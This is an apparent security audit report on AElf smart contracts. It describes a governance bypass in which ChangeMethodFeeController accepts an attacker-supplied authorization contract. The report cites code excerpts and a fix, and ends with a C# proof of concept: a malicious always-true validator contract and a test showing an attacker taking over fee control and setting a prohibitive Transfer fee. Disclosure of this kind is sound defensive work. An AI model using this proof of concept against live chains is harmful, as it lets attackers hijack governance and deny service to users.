# Audit Report

## Title
Governance Bypass via Malicious Authorization Contract in Method Fee Controller

## Summary
The `ChangeMethodFeeController` method in multiple AElf system contracts fails to validate that the new authority's contract address is a legitimate governance contract (Parliament/Association/Referendum). An attacker who obtains one Parliament approval can redirect the method fee controller to a malicious contract, gaining permanent control over transaction fees without further governance oversight.

## Finding Description

The vulnerability exists in the `CheckOrganizationExist` validation pattern used across all ACS1 implementations. When changing the method fee controller, the code performs a cross-contract call to validate the organization exists: [1](#0-0) 

The critical flaw is that `authorityInfo.ContractAddress` is user-supplied input with no validation that it points to a legitimate governance contract. The validation is circular - it asks the attacker's contract to validate itself.

The `ChangeMethodFeeController` method uses this flawed validation: [2](#0-1) 

The `AssertSenderAddressWith` check only verifies the caller is the current controller's owner address, which initially requires Parliament approval. However, once executed with malicious parameters, the attacker becomes the new owner and can directly call `SetMethodFee`: [3](#0-2) 

This pattern affects all system contracts implementing ACS1: [4](#0-3) [5](#0-4) [6](#0-5) 

While the Genesis contract provides `ValidateSystemContractAddress` to verify legitimate system contracts: [7](#0-6) 

This validation is NOT used in the `ChangeMethodFeeController` flow, leaving the vulnerability exploitable.

## Impact Explanation

**Critical Governance Breach**: After obtaining one Parliament approval, an attacker permanently controls method fee configuration across affected system contracts without requiring ongoing governance oversight. The attacker's address becomes the `MethodFeeController.Value.OwnerAddress` and can unilaterally call `SetMethodFee` to:

1. Set prohibitive fees causing denial-of-service on critical contract methods
2. Set zero fees draining protocol fee collection mechanisms  
3. Manipulate fee structures for economic advantage
4. Block legitimate governance from regaining control

**Protocol-Wide Scope**: The vulnerable pattern exists in 15+ system contracts including TokenContract, ParliamentContract, EconomicContract, CrossChainContract, ElectionContract, ConsensusContract, ProfitContract, TreasuryContract, and others. This represents a systemic failure of the governance security model.

**Fundamental Invariant Violation**: The AElf protocol's security model assumes method fee controllers are auditable governance organizations (Parliament/Association/Referendum) subject to ongoing multi-signature oversight. This vulnerability completely bypasses that invariant.

## Likelihood Explanation

**Attack Requirements**:
1. Deploy a malicious contract implementing `ValidateOrganizationExist` that always returns `true`
2. Create a Parliament proposal calling `ChangeMethodFeeController` with `AuthorityInfo` pointing to the malicious contract and attacker's address as owner
3. Obtain 2/3 Block Producer approval for the proposal

**Realistic Attack Scenarios**:
- Governance inattention during routine parameter updates
- Proposal parameter obfuscation (contract address appears valid)
- Social engineering or coordination with compromised BPs
- Rushed approval during crisis situations
- Assumption that contract-level validation handles security

**Moderate Complexity**: The primary barrier is obtaining one governance approval. However, historical blockchain governance attacks (e.g., Beanstalk governance exploit) demonstrate that sophisticated attackers can exploit governance processes, especially when proposal parameters are not thoroughly audited.

## Recommendation

Add explicit validation that the new controller's contract address is a recognized governance contract:

```csharp
private bool CheckOrganizationExist(AuthorityInfo authorityInfo)
{
    // Validate contract address is a legitimate governance contract
    var systemContracts = Context.GetSystemContractNameToAddressMapping();
    var isValidGovernanceContract = 
        authorityInfo.ContractAddress == systemContracts[HashHelper.ComputeFrom("AElf.ContractNames.Parliament")] ||
        authorityInfo.ContractAddress == systemContracts[HashHelper.ComputeFrom("AElf.ContractNames.Association")] ||
        authorityInfo.ContractAddress == systemContracts[HashHelper.ComputeFrom("AElf.ContractNames.Referendum")];
    
    Assert(isValidGovernanceContract, "Controller contract must be a legitimate governance contract.");
    
    return Context.Call<BoolValue>(authorityInfo.ContractAddress,
        nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.ValidateOrganizationExist),
        authorityInfo.OwnerAddress).Value;
}
```

Alternatively, use the existing `ValidateSystemContractAddress` method from the Genesis contract to verify the contract address.

## Proof of Concept

```csharp
// Malicious contract that always validates organizations
public class MaliciousAuthContract : MaliciousAuthContractContainer.MaliciousAuthContractBase
{
    public override BoolValue ValidateOrganizationExist(Address input)
    {
        // Always returns true, bypassing legitimate validation
        return new BoolValue { Value = true };
    }
}

// Attack flow test
[Fact]
public async Task GovernanceBypass_Via_MaliciousAuthContract()
{
    // 1. Deploy malicious auth contract
    var maliciousAuthAddress = await DeployMaliciousAuthContract();
    
    // 2. Create Parliament proposal to change method fee controller
    var attackerAddress = Accounts[1].Address;
    var maliciousAuthority = new AuthorityInfo
    {
        ContractAddress = maliciousAuthAddress,  // Malicious contract
        OwnerAddress = attackerAddress           // Attacker's address
    };
    
    var proposalId = await CreateParliamentProposal(
        TokenContractAddress,
        nameof(TokenContract.ChangeMethodFeeController),
        maliciousAuthority
    );
    
    // 3. Get 2/3 BP approval and release
    await ApproveWithMinersAsync(proposalId);
    await ParliamentContractStub.Release.SendAsync(proposalId);
    
    // 4. Verify attacker now controls method fees
    var controller = await TokenContractStub.GetMethodFeeController.CallAsync(new Empty());
    controller.OwnerAddress.ShouldBe(attackerAddress);
    controller.ContractAddress.ShouldBe(maliciousAuthAddress);
    
    // 5. Attacker can directly set method fees without governance
    var attackerStub = GetTokenContractStub(Accounts[1].KeyPair);
    var result = await attackerStub.SetMethodFee.SendAsync(new MethodFees
    {
        MethodName = "Transfer",
        Fees = { new MethodFee { Symbol = "ELF", BasicFee = 1000000000 } } // Prohibitive fee
    });
    
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    // Attack successful - attacker controls fees permanently
}
```

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_ACS1_MethodFeeProvider.cs (L13-22)
```csharp
    public override Empty SetMethodFee(MethodFees input)
    {
        foreach (var symbolToAmount in input.Fees) AssertValidFeeToken(symbolToAmount.Symbol, symbolToAmount.BasicFee);

        RequiredMethodFeeControllerSet();
        Assert(Context.Sender == State.MethodFeeController.Value.OwnerAddress, "Unauthorized to set method fee.");

        State.TransactionFees[input.MethodName] = input;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_ACS1_MethodFeeProvider.cs (L24-33)
```csharp
    public override Empty ChangeMethodFeeController(AuthorityInfo input)
    {
        RequiredMethodFeeControllerSet();
        AssertSenderAddressWith(State.MethodFeeController.Value.OwnerAddress);
        var organizationExist = CheckOrganizationExist(input);
        Assert(organizationExist, "Invalid authority input.");

        State.MethodFeeController.Value = input;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_ACS1_MethodFeeProvider.cs (L116-121)
```csharp
    private bool CheckOrganizationExist(AuthorityInfo authorityInfo)
    {
        return Context.Call<BoolValue>(authorityInfo.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.ValidateOrganizationExist),
            authorityInfo.OwnerAddress).Value;
    }
```

**File:** contract/AElf.Contracts.Parliament/ParliamentContract_ACS1_TransactionFeeProvider.cs (L56-60)
```csharp
    private bool CheckOrganizationExist(AuthorityInfo authorityInfo)
    {
        return Context.Call<BoolValue>(authorityInfo.ContractAddress,
            nameof(ValidateOrganizationExist), authorityInfo.OwnerAddress).Value;
    }
```

**File:** contract/AElf.Contracts.Economic/EconomicContract_ACS1_TransactionFeeProvider.cs (L71-76)
```csharp
    private bool CheckOrganizationExist(AuthorityInfo authorityInfo)
    {
        return Context.Call<BoolValue>(authorityInfo.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.ValidateOrganizationExist),
            authorityInfo.OwnerAddress).Value;
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_ACS1_TransactionFeeProvider.cs (L80-85)
```csharp
    private bool CheckOrganizationExist(AuthorityInfo authorityInfo)
    {
        return Context.Call<BoolValue>(authorityInfo.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.ValidateOrganizationExist),
            authorityInfo.OwnerAddress).Value;
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L59-64)
```csharp
    public override Empty ValidateSystemContractAddress(ValidateSystemContractAddressInput input)
    {
        var actualAddress = GetContractAddressByName(input.SystemContractHashName);
        Assert(actualAddress == input.Address, "Address not expected.");
        return new Empty();
    }
```
